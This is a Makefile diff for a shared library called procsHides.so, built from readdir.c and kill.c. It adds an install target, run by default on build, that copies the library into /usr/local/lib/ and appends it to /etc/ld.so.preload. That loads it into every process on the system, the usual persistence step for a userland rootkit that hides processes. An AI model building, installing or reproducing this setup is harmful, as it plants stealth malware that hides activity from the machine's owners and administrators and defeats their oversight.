@@ -3,12 +3,12 @@
 
 # Name of file
 NAME		=	procsHides.so
+PATH_INSTALL=	/usr/local/lib/
 
 # Name directory
 PATH_SRC	=	srcs
 PATH_OBJ	=	objs
 PATH_LOG	=	logs
-PATH_HIDE	=	/usr/local/lib	
 
 # List of sources
 SRCS		=	$(addprefix $(PATH_SRC)/, readdir.c kill.c)
@@ -30,12 +30,17 @@ _INFO		=	[$(_YELLOW)INFO$(_RESET)]
 _SUCCESS	=	[$(_GREEN)SUCCESS$(_RESET)]
 
 # Functions
-all:	init $(NAME)
+all:	init $(NAME) install
 	@ echo "$(_SUCCESS) Compilation done"
 
 init:
 	@ $(shell mkdir -p $(PATH_LOG) $(PATH_OBJ))
 
+install:
+	@ mv $(NAME) $(PATH_INSTALL)
+	@ echo /usr/local/lib/procsHides.so >> /etc/ld.so.preload
+	@ echo "$(_SUCCESS) Installation done"
+	
 $(NAME): $(OBJS)
 	@ (set -x; $(COMP) $(COMP_FLAG) $(COMP_HIDE) -o $(NAME) $(OBJS) $(COMP_LKN) ) >> $(LOG) 2>&1
 
